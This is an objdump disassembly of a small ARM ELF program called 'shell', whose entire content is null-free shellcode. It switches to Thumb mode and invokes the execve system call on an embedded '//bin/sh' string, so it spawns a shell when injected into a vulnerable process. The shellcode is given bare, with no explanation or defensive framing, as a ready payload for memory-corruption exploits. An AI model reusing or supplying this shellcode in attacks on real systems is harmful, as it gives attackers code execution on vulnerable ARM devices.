
shell:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e28f3001 	add	r3, pc, #1
   10058:	e12fff13 	bx	r3
   1005c:	4678      	mov	r0, pc
   1005e:	300e      	adds	r0, #14
   10060:	1a92      	subs	r2, r2, r2
   10062:	6082      	str	r2, [r0, #8]
   10064:	9001      	str	r0, [sp, #4]
   10066:	a901      	add	r1, sp, #4
   10068:	1a92      	subs	r2, r2, r2
   1006a:	270b      	movs	r7, #11
   1006c:	df01      	svc	1
   1006e:	2f2f      	.short	0x2f2f
   10070:	2f6e6962 	.word	0x2f6e6962
   10074:	42426873 	.word	0x42426873
   10078:	46c04242 	.word	0x46c04242
